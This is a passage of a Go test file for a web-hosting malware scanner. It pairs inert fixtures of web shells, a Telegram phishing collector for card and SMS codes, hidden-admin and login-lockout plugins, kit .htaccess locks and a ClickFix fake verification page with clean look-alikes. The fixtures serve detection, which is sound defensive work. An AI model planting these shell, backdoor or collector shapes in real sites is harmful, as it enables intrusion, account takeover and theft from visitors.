	for _, rel := range []string{"wp-admin/css/worksec.php", "wp-includes/css/worksec.php", "wp-admin/images/worksec.php"} {
		if d := check(rel); d == nil || d.Signature != "PHP.Planted.WordPressCoreSpray" || d.Category != CatVirus {
			t.Errorf("%s: %+v", rel, d)
		}
	}
	if d := check("wp-includes/images/lonely.php"); d == nil || d.Category != CatSuspicious {
		t.Errorf("one PHP file in core images: %+v", d)
	}
	// Every copy, also outside the asset folders, and also the last ones
	// once the others are quarantined.
	if d := check("wp-includes/ID3/worksec.php"); d == nil || d.Signature != "PHP.Planted.WordPressCoreSpray" {
		t.Errorf("copy outside the asset folders: %+v", d)
	}
	for _, d := range []string{"wp-admin/css", "wp-admin/images", "wp-includes/css", "wp-includes/ID3", "wp-includes/IXR"} {
		os.Remove(filepath.Join(root, d, "worksec.php"))
	}
	if d := check("wp-includes/Text/worksec.php"); d == nil || d.Signature != "PHP.Planted.WordPressCoreSpray" {
		t.Errorf("last copy: %+v", d)
	}
	// Core's own names in several folders (a release newer than the known
	// files): not a spray.
	for _, d := range []string{"wp-admin", "wp-admin/network", "wp-admin/user"} {
		put(d+"/about.php", inert)
	}
	for _, rel := range []string{"wp-includes/fonts/class-wp-font-face.php", "wp-admin/includes/custom-helper.php", "wp-admin/network/about.php"} {
		if d := check(rel); d != nil && strings.HasPrefix(d.Signature, "PHP.Planted.") {
			t.Errorf("%s: %s", rel, d.Signature)
		}
	}
	// Not a WordPress site: a folder that is only called wp-admin.
	other := filepath.Join(t.TempDir(), "u", "public_html", "wp-admin", "css")
	os.MkdirAll(other, 0o755)
	if d := s.checkContent(filepath.Join(other, "theme.php"), ".php", []byte(inert)); d != nil {
		t.Errorf("not WordPress: %s", d.Signature)
	}
}

// business100 (2026-10-26): two SEO doorway farms (sahibsul, bashopco)
// had no finding. Their self-healing kit kept dormant copies named
// .sys_<hex>.php, .sess_<hex>.php, .tmp_<hex>.php, .cache_<hex>.php
// (mode 000) and restore scripts in ~/logs/. Hidden PHP named by random
// hex, hidden PHP without permissions and PHP in ~/logs are malware;
// another hidden PHP file is suspicious (the AI looks); developer tools'
// dotfiles in plugins and packages stay alone.
func TestFleetHiddenAndLogsPHP(t *testing.T) {
	s := newScanner(t)
	inert := "<?php /* inert test fixture */ echo 'x';"
	dir := filepath.Join(t.TempDir(), "home2", "u")
	write := func(rel string, mode os.FileMode) string {
		p := filepath.Join(dir, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(inert), 0o644)
		os.Chmod(p, mode)
		return p
	}
	// The test runs from a temporary folder: name it like a home.
	homeOf := func(p string) string { return "/home2/u" + strings.TrimPrefix(p, dir) }
	check := func(p string) *Detection {
		return plantedByName(homeOf(p), func(string) int { return plantedMode(p) })
	}
	for rel, sig := range map[string]string{
		"public_html/assets/.sys_9f3a1c7e2b.php":  "PHP.Planted.HiddenRandomName",
		"public_html/.sess_0a1b2c3d4e5f.php":      "PHP.Planted.HiddenRandomName",
		"cavescode.com/app/.cache_deadbeef01.php": "PHP.Planted.HiddenRandomName",
		"logs/cache_gc.php":                       "PHP.Planted.InLogsFolder",
		"logs/example.com/restore_config.php":     "PHP.Planted.InLogsFolder",
	} {
		if d := check(write(rel, 0o644)); d == nil || d.Signature != sig || d.Category != CatVirus {
			t.Errorf("%s: %+v", rel, d)
		}
	}
	if d := check(write("public_html/en/.sitemap_indo.php", 0)); d == nil || d.Signature != "PHP.Planted.HiddenDormant" {
		t.Errorf("dormant hidden copy: %+v", d)
	}
	if d := check(write("public_html/en/.sitemap_indo2.php", 0o644)); d == nil || d.Category != CatSuspicious {
		t.Errorf("hidden PHP: %+v", d)
	}
	for _, rel := range []string{
		"public_html/wp-content/plugins/x/.php-cs-fixer.dist.php",
		"public_html/wp-content/plugins/x/.phpstorm.meta.php",
		"public_html/vendor/y/.php_cs.dist.php",
		"public_html/wp-content/plugins/x/.rector.php",
		"laravel/app/.env.local.php",
		"public_html/index.php",
		"public_html/logs/view.php", // a site's own folder called logs
	} {
		if d := check(write(rel, 0o644)); d != nil {
			t.Errorf("%s: %s", rel, d.Signature)
		}
	}
	// Through the content check too (scan and recheck).
	if d := s.checkContent("/home2/u/logs/cache_gc.php", ".php", []byte(inert)); d == nil || d.Signature != "PHP.Planted.InLogsFolder" {
		t.Errorf("content check: %+v", d)
	}
}

// server1 (2026-10-28): a bank phishing kit, casino SEO spam, fake plugins
// and a WooCommerce-named loader, with no finding (101 files). Inert
// fixtures built the same way; plugins and pages that look alike stay clean.
func TestFleetPhishingCasinoAndLoaders(t *testing.T) {
	s := newScanner(t)
	home := t.TempDir()
	put := func(rel, body string) string {
		p := filepath.Join(home, "public_html", rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(body), 0o644)
		return p
	}
	check := func(p string) *Detection {
		t.Helper()
		info, _ := os.Lstat(p)
		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
		if err != nil && err != ErrTrusted {
			t.Fatal(err)
		}
		return d
	}
	pieces := strings.Repeat("$k = 'wp'.'_fo'.'ot'.'er'; ", 25)
	hashNames := ""
	for i := range 12 {
		hashNames += fmt.Sprintf("$var_%032x = 'x'; ", i)
	}
	collector := "<?php\n$cfg = ['tg_token' => 'inert', 'tg_chat' => '1'];\n$ip = $_SERVER['REMOTE_ADDR'];\n" +
		"$msg = 'clave: ' . $_POST['clave'] . ' sms: ' . $_POST['sms'] . ' cvv: ' . $_POST['cvv'];\n" +
		"file_get_contents('https://api.telegram.org/bot' . $cfg['tg_token'] . '/sendMessage?text=' . urlencode($msg));\n"
	casino := strings.Repeat("<li><a href=\"https://example.invalid/c\">online casino free spins no deposit</a> best slots bonus</li>\n", 16)
	hidden := "<section style=\"position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)\"><ul>\n" + casino + "</ul></section>\n"
	doorway := strings.Repeat("<link rel=\"stylesheet\" href=\"/wp-content/themes/t/style.css\">\n", 5) +
		strings.Repeat("<p>Claim free spins and a deposit bonus at the best online casino with no deposit slots.</p>\n", 10)
	put("kit/acciones.php", collector)
	put("wp-content/mu-plugins/section.html", hidden)
	for rel, sig := range map[string]string{
		"wp-content/plugins/fast-checker-572d/inc/class-handler.php":   "PHP.Obfuscated.SplitStrings",
		"wp-content/plugins/woocommerce_inputs/woocommerce-load.php":   "PHP.Obfuscated.HashNames",
		"wp-content/plugins/woocommerce_inputs/woocommerce_inputs.php": "PHP.Backdoor.TelegramDeadDrop",
		"wp-content/plugins/woocommerce_inputs/fhelpers.php":           "PHP.SEOSpam.RemoteFooterLinks",
		"wp-content/plugins/woo_inputs/woocommerce_inputs.php":         "PHP.Backdoor.HiddenPluginLoader",
		"kit/acciones.php":                                    "Phishing.Collector.Telegram",
		"kit/index.html":                                      "Phishing.KitPage",
		"wp-content/mu-plugins/section.html":                  "HTML.SEOSpam.HiddenGambling",
		"wp-content/mu-plugins/section.php":                   "PHP.SEOSpam.HiddenGamblingPrinter",
		"100-free-spins-no-deposit.html":                      "HTML.SEOSpam.GamblingDoorway",
		"wp-content/uploads/0123456789abcdef0123456789abcdef": "Dropper.Base64URL",
	} {
		var body string
		switch sig {
		case "PHP.Obfuscated.SplitStrings":
			body = "<?php\nclass H { function __construct() { " + pieces + " add_action($k, [$this, 'p']); } }\n"
		case "PHP.Obfuscated.HashNames":
			body = "<?php\n" + hashNames + "\n$r = wp_remote_get('https://example.invalid/');\n"
		case "PHP.Backdoor.TelegramDeadDrop":
			body = "<?php\n$page = wp_remote_get('https://t.me/s/inert_channel');\n$d = 'x';\nwp_insert_user(['user_login' => 'inert', 'role' => 'administrator']);\n"
		case "PHP.SEOSpam.RemoteFooterLinks":
			body = "<?php\nadd_action('wp_footer', function () { $r = wp_remote_get('https://example.invalid/api/links', ['sslverify' => false]); echo wp_remote_retrieve_body($r); });\n"
		case "PHP.Backdoor.HiddenPluginLoader":
			body = "<?php\nadd_filter('all_plugins', function ($p) { unset($p[plugin_basename(__FILE__)]); return $p; });\n" +
				"add_filter('plugin_action_links_' . plugin_basename(__FILE__), '__return_empty_array');\n" +
				"$z = wp_remote_get('https://example.invalid/wp-plugin/?update-check');\nfile_put_contents('/tmp/inert.zip', wp_remote_retrieve_body($z));\n$f = __DIR__ . '/r.php';\ninclude $f;\n"
		case "Phishing.Collector.Telegram":
			body = collector
		case "Phishing.KitPage":
			body = "<form action=\"send.php\"><input name=\"clave\" type=\"password\"></form>\n<script>const BACKEND='acciones.php';fetch(BACKEND+'?accion=enviar',{method:'POST'})</script>\n"
		case "HTML.SEOSpam.HiddenGambling":
			body = hidden
		case "PHP.SEOSpam.HiddenGamblingPrinter":
			body = "<?php\n$file = __DIR__ . '/section.html';\n$print = function () use ($file) { readfile($file); };\nadd_action('wp_footer', $print);\n"
		case "HTML.SEOSpam.GamblingDoorway":
			body = doorway
		case "Dropper.Base64URL":
			body = base64.StdEncoding.EncodeToString([]byte("https://example.invalid/inert"))
		}
		if d := check(put(rel, body)); d == nil || d.Signature != sig || d.Category != CatVirus {
			t.Errorf("%s: want %s, got %+v", rel, sig, d)
		}
	}
	// Look-alikes: a one-time-code plugin sending by Telegram, a casino
	// site's own page with a hidden menu, a page cache, a footer link
	// plugin with its own links, a hex-named cache file, a login page.
	for rel, body := range map[string]string{
		"wp-content/plugins/tg-otp/otp.php": "<?php\n$chat = get_option('chat_id');\n$ip = $_SERVER['REMOTE_ADDR'];\n$otp = wp_rand(100000, 999999);\n" +
			"wp_remote_post('https://api.telegram.org/bot' . get_option('token') . '/sendMessage', ['body' => ['chat_id' => $chat, 'text' => 'Your OTP code for login: ' . $otp . ' (sms fallback, pin reset, password reset)']]);\n",
		"casino-reviews.html": "<nav style=\"display:none\" id=\"m\">" + strings.Repeat("<a href=\"/casino-reviews/\">Casino reviews</a> <a href=\"/free-spins/\">Free spins</a>\n", 10) + "</nav>\n" +
			"<a class=\"skip\" style=\"position:absolute;left:-10000px;width:1px;height:1px\" href=\"#main\">Skip to content</a>\n" + strings.Repeat("<p>Our online casino reviews compare free spins, slots and the welcome bonus of each casino.</p>\n", 10) +
			"<a href=\"/a\">a</a><a href=\"/b\">b</a><a href=\"/c\">c</a>\n",
		"wp-content/cache/page/best-casino-bonus.html":      doorway,
		"wp-content/plugins/links/links.php":                "<?php\nadd_action('wp_footer', function () { echo '<a href=\"https://example.test/partner\">Partner</a>'; });\n",
		"wp-content/cache/ffffffffffffffffffffffffffffffff": "a:1:{s:4:\"html\";s:5:\"inert\";}",
		"login.html": "<form action=\"wp-login.php\" method=\"post\"><input type=\"password\" name=\"pwd\"></form>\n",
	} {
		if d := check(put(rel, body)); d != nil {
			t.Errorf("%s flagged: %+v", rel, d)
		}
	}
}

// server1 (2026-10-28, full scan 59): 9,790 macOS metadata files
// (__MACOSX/…/._Kernel.php, AppleDouble) as hidden PHP, a PsySH fixture,
// PHP-CS-Fixer's settings requiring each other as a hidden include, and
// phpstan's string escaper (a regex of byte ranges, assert()) as
// char-encoded obfuscation. The real thing stays caught.
func TestFleetMacMetadataAndDevFiles(t *testing.T) {
	s := newScanner(t)
	apple := append([]byte{0, 5, 0x16, 7, 0, 2, 0, 0}, []byte("Mac OS X        \x00\x02\x00\x00\x00\x09com.apple.quarantine")...)
	clean := map[string][]byte{
		"/home2/u/site/__MACOSX/app/vendor/laravel/framework/src/Illuminate/Foundation/Http/._Kernel.php": apple,
		"/home2/u/site/vendor/x/._Select.php":                                    apple,
		"/home2/u/public_html/vendor/psy/psysh/test/fixtures/project/.psysh.php": []byte("<?php\nreturn array('useReadline' => false);\n"),
		"/home2/u/site/vendor/barryvdh/laravel-ide-helper/.php-cs-fixer.tests.php": []byte("<?php\nrequire __DIR__ . '/vendor/autoload.php';\n" +
			"$config = require __DIR__ . '/.php-cs-fixer.common.php';\nreturn (new PhpCsFixer\\Config())->setRules($config);\n"),
		"/home2/u/site/vendor/phpstan/phpdoc-parser/src/Ast/ConstExpr/ConstExprStringNode.php": []byte("<?php declare(strict_types = 1);\nnamespace PHPStan\\PhpDocParser\\Ast\\ConstExpr;\n" +
			"class ConstExprStringNode {\n\tprivate function escape(string $v): string {\n\t\t$regex = '/(\n" +
			strings.Repeat("\t\t\t| [\\xC0-\\xC1] | \\xE0(?=[\\x80-\\x9F]) | [\\xF0-\\xF4](?![\\x80-\\xBF]{3}) | (?<=[\\x00-\\x7F\\xF5-\\xFF])[\\x80-\\xBF]\n", 6) +
			"\t\t)/x';\n\t\treturn preg_replace_callback($regex, static function ($m) {\n\t\t\tassert(strlen($m[0]) === 1);\n\t\t\treturn '\\\\x' . dechex(ord($m[0]));\n\t\t}, $v);\n\t}\n}\n"),
	}
	for p, body := range clean {
		if d := s.checkContent(p, ".php", body); d != nil {
			t.Errorf("%s flagged: %+v", p, d)
		}
	}
	for p, body := range map[string]string{
		// Real PHP behind a "._" name is still a hidden PHP file.
		"/home2/u/public_html/wp-content/._x.php": "<?php echo 'inert';",
		// A hidden include of a planted name is still a loader.
		"/home2/u/public_html/wp-content/index2.php": "<?php include __DIR__ . '/.cache_5f2a.php';",
		// Escapes spelling words, run by eval, are still obfuscation.
		"/home2/u/public_html/wp-content/x.php": "<?php\n" + strings.Repeat("$a[] = \"\\x69\\x6e\\x65\\x72\\x74\";\n", 12) + "eval(implode('', $a));\n",
	} {
		if d := s.checkContent(p, ".php", []byte(body)); d == nil {
			t.Errorf("%s not found", p)
		}
	}
}

// server1 (2026-10-29, full scan 62): phpList's admin/.htaccess refuses
// .php and .inc and allows its three entry points, and was quarantined as
// an attack kit's lock. Without the kits' extension list (py, exe, PHP in
// mixed case, suspected) and with names allowed by their ending, the lock
// is an application's; the kits' own locks stay malware, also the ones the
// AI called clean.
func TestFleetAppHtaccessLock(t *testing.T) {
	phplist := "<FilesMatch \"\\.(php|inc)$\">\n\t<IfModule mod_authz_core.c>\n\t\tRequire all denied\n\t</IfModule>\n</FilesMatch>\n" +
		"<FilesMatch \"(index.php|connector.php|upload.php)$\">\n\t<IfModule mod_authz_core.c>\n\t\tRequire all granted\n\t</IfModule>\n</FilesMatch>\n"
	if d := htaccessHack([]byte(phplist)); d != nil {
		t.Errorf("application lock: %+v", d)
	}
	for _, kit := range []string{
		"<FilesMatch \".*\\.(py|exe|phtml|php|PHP|Php|PHp|pHp|suspected)$\">\nOrder Allow,Deny\nDeny from all\n</FilesMatch>\n<FilesMatch \"^(wp-login.php)$\">\nOrder Allow,Deny\nAllow from all\n</FilesMatch>",
		"<FilesMatch '.(py|exe|phtml|php|PHP|Php|php5|suspected)$'>\r\nOrder allow,deny\r\nDeny from all\r\n</FilesMatch>\r\n<FilesMatch '^(index.php)$'>\r\nOrder allow,deny\r\nAllow from all\r\n</FilesMatch>",
		"<FilesMatch '.(py|exe|php|PHP|Php|suspected)$'>\nOrder allow,deny\nDeny from all\n</FilesMatch>",
		"<FilesMatch \"\\.php$\">\nRequire all denied\n</FilesMatch>\n<FilesMatch \"^(index\\.php|x7shell\\.php)$\">\nRequire all granted\n</FilesMatch>",
	} {
		if d := htaccessHack([]byte(kit)); d == nil || d.Category != CatVirus || d.Signature != "Htaccess.Hacked.PHPLock" {
			t.Errorf("kit lock: %+v", d)
		}
	}
}

// server1 (2026-10-29, full scan 62): official plugin and library files
// quarantined. Each inert fixture keeps the shape that fired; the attack
// next to it stays caught.
func TestFleetLibrariesOfScan62(t *testing.T) {
	s := newScanner(t)
	check := func(path string, body string) *Detection {
		t.Helper()
		return s.checkContent(path, extOf(path), []byte(body))
	}
	masks := ""
	for i := range 60 {
		masks += fmt.Sprintf("\t\t%d => \"\\xff\\xff\\xff\\x%02x\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",\n", i, i)
	}
	big := strings.Repeat("// LayerSlider admin actions: sliders, revisions, templates.\nfunction ls_action_x() { update_option('ls_x', 1); }\n", 300)
	gotos := ""
	for i := range 10 {
		gotos += fmt.Sprintf("if ($m !== 'GET') { goto not_simple_trailing_slash_GET_method_%d; }\nreturn rawurldecode($p);\nnot_simple_trailing_slash_GET_method_%d:\n", i, i)
	}
	clean := map[string]string{
		// Wordfence wf-waf utils.php: IPv6 masks as binary strings.
		"/home2/u/public_html/wp-content/plugins/wordfence/vendor/wordfence/wf-waf/src/lib/utils.php": "<?php\nclass wfWAFUtils {\n\tstatic function hmac($algo, $key) { return $algo($key); }\n\tstatic $masks = array(\n" + masks + "\t);\n}\n",
		// Vafpress (JNews, Rehub): the AJAX wrapper calls allowed functions only.
		"/home2/u/public_html/wp-content/plugins/jnews-essential/lib/vp/bootstrap.php": "<?php\nfunction vp_ajax_wrapper() {\n\t$function = $_POST['func'];\n\t$params = $_POST['params'];\n\tif (VP_Security::instance()->is_function_whitelisted($function)) {\n\t\t$result = call_user_func_array($function, $params);\n\t}\n}\n",
		// LayerSlider actions.php: an importer behind nonce checks.
		"/home2/u/public_html/wp-content/plugins/LayerSlider/assets/wp/actions.php": "<?php\n" + big + "function ls_import_online() {\n\tcheck_ajax_referer('ls-import-demos', 'security');\n\t$slider = urlencode($_GET['slider']);\n\t$downloadPath = sys_get_temp_dir() . '/' . sanitize_file_name($_GET['slider']) . '.zip';\n\tfile_put_contents($downloadPath, wp_remote_retrieve_body(wp_remote_get('https://example.invalid/' . $slider)));\n}\n",
		// SquirrelMail and SitePad: /e with a fixed replacement.
		"/home2/u/public_html/squirrel/functions/encode/koi8_r.php": "<?php\nfunction charset_encode_koi8_r($string) {\n\treturn preg_replace(\"/([\\200-\\377])/e\", \"'&#' . ord('\\\\1') . ';'\", $string);\n}\n",
		// Symfony's build script: commands from the command line's arguments.
		"/home2/u/public_html/vendor/symfony/symfony/.github/build-packages.php": "<?php\nif (3 > $_SERVER['argc']) { exit(1); }\n$dirs = $_SERVER['argv'];\n$base = trim(shell_exec(sprintf('git merge-base %s HEAD', array_shift($dirs))));\n",
		// A generated router (Symfony's dumper fixtures): labelled gotos.
		"/home2/u/public_html/vendor/symfony/symfony/src/Symfony/Component/Routing/Tests/Fixtures/dumper/url_matcher6.php": "<?php\nfunction match($p, $m) {\n" + gotos + "}\n",
		// phpxmlrpc: the saved error handler is called by its name.
		"/home2/u/public_html/wp-content/plugins/x/xmlrpc-3.0/lib/xmlrpcs.inc": "<?php\nfunction _xmlrpcs_errorHandler($c, $e) {\n\t$GLOBALS['_xmlrpcs_prev_ehandler']($c, $e);\n}\nfunction parse($d) { return gzuncompress($d); }\n",
		// Unyson: a random string built with chr(), far from any callback.
		"/home2/u/public_html/wp-content/plugins/unyson/framework/helpers/general.php": "<?php\nfunction fw_rand($sha) {\n\t$rnd = '';\n\tfor ($c = 0; $c < 32; $c += 2) { $rnd .= chr( hexdec( $sha[ $c ] . $sha[ $c + 1 ] ) ); }\n\treturn $rnd;\n}\n" + strings.Repeat("function fw_helper_x() { return get_option('fw_x'); }\n", 60) + "function fw_call($cb) { return isset($_SERVER['windir']) ? $cb() : $cb(); }\n",
		// A Telegram login-alert plugin with its own settings form.
		"/home2/u/public_html/wp-content/plugins/tg-alerts/admin.php": "<?php\nwp_remote_get('https://api.telegram.org/bot' . get_option('tg_t') . '/sendMessage?text=login');\n?><form method=\"post\"><input type=\"password\" name=\"tg_t\"></form>\n",
		// LiteSpeed Cache's settings, PicoFeed's site rules, Filament stubs.
		"/home2/u/public_html/wp-content/.litespeed_conf.php":                                                   "<?php exit; // LiteSpeed Cache runtime configuration. Do not edit. ?>\n{\"debug\":0,\"object-kind\":false}",
		"/home2/u/public_html/wp-content/plugins/penci-feeds/classes/libs/fguillot/PicoFeed/Rules/.wsj.com.php": "<?php\nreturn array(\n\t'grabber' => array('%.*%' => array('test_url' => 'https://example.test/a', 'body' => array('//div[@class=\"article\"]'))),\n);\n",
		"/home2/u/public_html/vendor/filament/forms/.stubs.php":                                                 "<?php\nnamespace Livewire\\Features;\nclass Testable { public function fillForm(array $state = []): static { return $this; } }\n",
	}
	for p, body := range clean {
		if d := check(p, body); d != nil {
			t.Errorf("%s flagged: %+v", p, d)
		}
	}
	// Really Simple Security's prepend; another prepend is still reported.
	rss := "; BEGIN Really Simple Auto Prepend File\nauto_prepend_file = '/home/u/public_html/wp-content/advanced-headers.php'\n; END Really Simple Auto Prepend File"
	if d := configLoader([]byte(rss)); d != nil {
		t.Errorf("Really Simple Security prepend flagged: %+v", d)
	}
	if d := configLoader([]byte("auto_prepend_file = '/home/u/public_html/wp-content/advanced-headers.php'")); d == nil {
		t.Error("unmarked prepend not reported")
	}
	// js-beautify's unpacker inside node_modules.
	if d := capHeuristic("/home2/u/nodevenv/app/10/lib/node_modules/js-beautify/js/src/unpackers/myobfuscate_unpacker.js", ".js",
		&Detection{CatSuspicious, "JS.Injection.DocumentWriteUnescape"}); d != nil {
		t.Errorf("node package flagged: %+v", d)
	}
	// A Perl script holding a web shell is still a web shell (PHP runs it
	// when it is included).
	if d := analyze(".pl", []byte("#!/usr/bin/perl\n<?php system($_GET['x']); ?>\n")); d == nil {
		t.Error("shell behind a perl shebang not found")
	}
	// A Perl program carrying PHP as text (SquirrelMail's conf.pl).
	perl := "#!/usr/bin/env perl\nmy $ok = eval(\"require 'conf.pl'\");\nprint CF \"<?php\\n\";\n" + strings.Repeat("print CF \"$\" . \"conf\" . \"['\" . \"$k\" . \"'] = '\" . \"$v\" . \"';\\n\";\n", 30)
	if v := analyzePHP([]byte(perl)); v == nil || v.category != CatSuspicious {
		t.Fatalf("perl fixture does not reproduce conf.pl: %+v", v)
	}
	if d := analyze(".pl", []byte(perl)); d != nil {
		t.Errorf("perl program flagged: %+v", d)
	}
	// composer and php-cs-fixer shipped as phars without an extension.
	phar := buildPhar("<?php Phar::mapPhar('composer.phar'); require 'phar://composer.phar/bin/composer'; ",
		map[string]string{"src/Util/Eval.php": "<?php namespace Composer\\Util; class E { function run($code) { return eval($code); } }"})
	if old := analyze("", phar); old == nil {
		t.Fatal("phar fixture does not reproduce the old false positive")
	}
	if d := check("/home2/u/public_html/vendor/phpunit/phpunit/tools/composer", string(phar)); d != nil {
		t.Errorf("extensionless phar flagged: %+v", d)
	}
	for p, body := range map[string]string{
		"/home2/u/public_html/wp-content/x1.php":   "<?php\n$f = $_POST['f'];\ncall_user_func_array($f, array($_POST['a']));\n",
		"/home2/u/public_html/wp-content/x2.php":   "<?php\necho preg_replace('/.*/e', $_POST['c'], 'x');\n",
		"/home2/u/public_html/wp-content/x3.php":   "<?php\necho preg_replace(\"/(.*)/e\", \"eval('\\\\1')\", 'x');\n",
		"/home2/u/public_html/wp-content/x4.php":   "<?php\nsystem($_SERVER['HTTP_CMD']);\n",
		"/home2/u/public_html/wp-content/x5.php":   "<?php\n$GLOBALS['_1452_'][3](base64_decode('aW5lcnQ='));\n",
		"/home2/u/public_html/wp-content/x6.php":   "<?php\n$k = 'x';\n$s = '';\nfor ($i = 0; $i < 9; $i++) { $s .= chr(ord($k[$i % 1]) ^ 7); }\n$s($_POST['a']);\n",
		"/home2/u/public_html/wp-content/.x_7.php": "<?php exit_soon(); include $_GET['p'];",
		// A SumUp kit page: visits reported to a bot, an OTP form.
		"/home2/u/public_html/wp-admin/sumup/web/email.php": "<?php\nfunction notify($m, $t, $c) { return file_get_contents('https://api.telegram.org/bot' . $t . '/sendMessage?chat_id=' . $c . '&text=' . urlencode($m)); }\nnotify('user in the email page!', $bot_token, $rez_chat);\n?><title>Authentication - EMAIL</title><form method=\"post\" action=\"send.php\"><input name=\"11\" autocomplete=\"one-time-code\" maxlength=\"1\"></form>\n",
		// A packer's payload in one long escaped string.
		"/home2/u/public_html/recommend.php":                    "<?php\n$p = base64_decode(\"" + strings.Repeat("\\x61\\x57\\x35\\x6c", 30) + "\");\n$k = openssl_decrypt($p, 'aes-128-cbc', 'k');\n",
		"/home2/u/public_html/wp-content/x8.php":                "<?php\n$c = $_POST['c'];\necho preg_replace('/.*/e', '\\0', $c);\n",
		"/home2/u/public_html/wp-content/x9.php":                "<?php\n$f = $_POST['f'];\nif (in_array($f, array('system', 'exec'))) { call_user_func_array($f, array($_POST['a'])); }\n",
		"/home2/u/public_html/wp-content/.stubs_9f3a1c7e2b.php": "<?php echo 'inert';",
		"/home2/u/public_html/wp-content/.rules.php":            "<?php return require 'inert-loader.txt';",
		"/home2/u/public_html/wp-content/.rules2.php":           "<?php return array('a' => Loader::run('inert'));",
	} {
		if d := check(p, body); d == nil {
			t.Errorf("%s not found", p)
		}
	}
}

// server1 and server100 (2026-10-30): the ClickFix kit - a fake Cloudflare
// human check copying a command for the visitor to paste into the Run box,
// the plugins serving it, a hidden administrator, an owner lockout, the
// .htaccess sending the site to the check, a hidden payload and doorway
// loaders; 1 of 1,986 files had a finding. Inert shapes of each, then the
// look-alikes real sites have.
func TestFleetClickFixKit(t *testing.T) {
	s := newScanner(t)
	home := t.TempDir()
	put := func(rel, body string) string {
		p := filepath.Join(home, "public_html", rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(body), 0o644)
		return p
	}
	check := func(p string) *Detection {
		t.Helper()
		info, _ := os.Lstat(p)
		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
		if err != nil && err != ErrTrusted {
			t.Fatal(err)
		}
		return d
	}
	steps := "<p>Verify you are human by completing the action below.</p><ol><li>Press &amp; hold the Windows Key <svg viewBox='0 0 24 24'></svg> + <b>R</b></li>" +
		"<li>In the verification window, press <b>Ctrl</b> + <b>V</b></li><li>Press <b>Enter</b></li></ol>"
	var z bytes.Buffer
	zw, _ := flate.NewWriter(&z, flate.BestCompression)
	zw.Write([]byte("$a = base64_decode('aW5lcnQ='); eval('/* inert */' . $a);"))
	for i := range 80 {
		fmt.Fprintf(zw, " /* %x */", md5.Sum([]byte{byte(i)}))
	}
	zw.Close()
	hash := "$wp$2y$10$" + strings.Repeat("a", 53)
	kit := map[string]struct{ sig, body string }{
		"wp-content/plugins/seo-1772128746/captcha.html": {"Phishing.ClickFix.FakeVerification",
			"<html><body>" + steps + "<script>var command = 'echo inert';document.getElementById('cb').onclick=function(){navigator.clipboard.writeText(command);}</script></body></html>"},
		"wp-content/mu-plugins/core-banner.php": {"Phishing.ClickFix.FakeVerification",
			"<?php\n/* Plugin Name: Core Banner */\nadd_action( 'template_redirect', function () { if ( is_user_logged_in() ) return; echo '<title>Just a moment...</title>" +
				strings.ReplaceAll(steps, "'", `\'`) + "<script>function c(e){e.clipboardData.setData(\\'text/plain\\', \\'echo inert\\');}document.execCommand(\\'copy\\');</script>'; exit; } );\n"},
		"wp-content/plugins/wp-image-reloaded/assets/js/captcha-loader.js": {"Phishing.ClickFix.FakeVerification",
			"var t={en:{lure:\"I'm not a robot\",s1:\"Hold the Windows key and press R\",s2:\"Press Ctrl+V to paste verification code\"}};\nfunction copy(x){navigator.clipboard.writeText(x).catch(function(){document.execCommand('copy')})}\n"},
		"wp-content/plugins/adminimize-images-soon/cf-captcha-windows.php": {"Phishing.ClickFix.FakeClearance",
			"<?php\n/* Plugin Name: CF Captcha */\nadd_action('init', function () { if (isset($_GET['p']) && $_GET['p'] === '1') { readfile(__DIR__ . '/captcha.html'); exit; } });\n" +
				"add_action('wp_footer', function () { ?><script>window.addEventListener('message', function () { document.cookie = 'cf_clearance=1;path=/'; });</script><?php });\n"},
		"wp-content/plugins/cf-security-shield/cf-security-shield.php": {"PHP.Backdoor.DNSTXTDeadDrop",
			"<?php\nadd_action('wp_ajax_nopriv_cf_get_text', 'cf_text');\nfunction cf_text() { $r = dns_get_record('example.invalid', DNS_TXT); if ($r && isset($r[0]['txt'])) { wp_send_json_success(array('text' => $r[0]['txt'])); } }\n"},
		"wp-content/mu-plugins/service-admin-bootstrap.php": {"PHP.Backdoor.HiddenAdmin",
			"<?php\ndefine('SAB_ROLE', 'administrator');\ndefine('SAB_HASH', '" + hash + "');\nadd_action('init', function () { global $wpdb; $id = wp_insert_user(array('user_login' => 'svc', 'user_pass' => wp_generate_password(32), 'role' => SAB_ROLE));\n" +
				"$wpdb->update( $wpdb->users, array( 'user_pass' => SAB_HASH ), array( 'ID' => $id ) ); });\nadd_filter('pre_count_users', function ($r) { return $r; });\nadd_action('pre_user_query', function ($q) { $q->query_where .= ' AND ID <> 0'; });\n"},
		"wp-content/mu-plugins/cache.php": {"PHP.Backdoor.LoginLockdown",
			"<?php\n/* Plugin Name: Core Functions */\nadd_filter('authenticate', function ($user, $u, $p) { if (!empty($u) || !empty($p)) { return new WP_Error('lockdown', 'Error'); } return $user; }, 30, 3);\n" +
				"add_filter('allow_password_reset', '__return_false');\nadd_filter('rest_authentication_errors', function ($result) { return new WP_Error('lockdown', 'Error'); });\n"},
		"hiroshi.php": {"PHP.SEOSpam.RemoteDoorway",
			"<?php\n$duri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';\n$web = 'hp?web=' . $host . '&zz=' . disbot() . '&uri=' . $duri . '&lang=' . $lang;\n"},
		".6c02c6d7": {"PHP.Dropper.HiddenPayload", base64.StdEncoding.EncodeToString(z.Bytes())},
	}
	for rel, k := range kit {
		if d := check(put(rel, k.body)); d == nil || d.Signature != k.sig || d.Category != CatVirus {
			t.Errorf("%s: want %s, got %+v", rel, k.sig, d)
		}
	}
	for rel, body := range map[string]string{
		// A how-to with a copy button: no human check.
		"kb/flush-dns.html": "<p>Press <b>Win</b> + <b>R</b>, then <b>Ctrl</b> + <b>V</b> and Enter to run the command in the terminal.</p>" +
			"<button onclick=\"navigator.clipboard.writeText('ipconfig /flushdns')\">Copy</button>",
		// A CAPTCHA and a copy-coupon button on one page: nothing to paste anywhere.
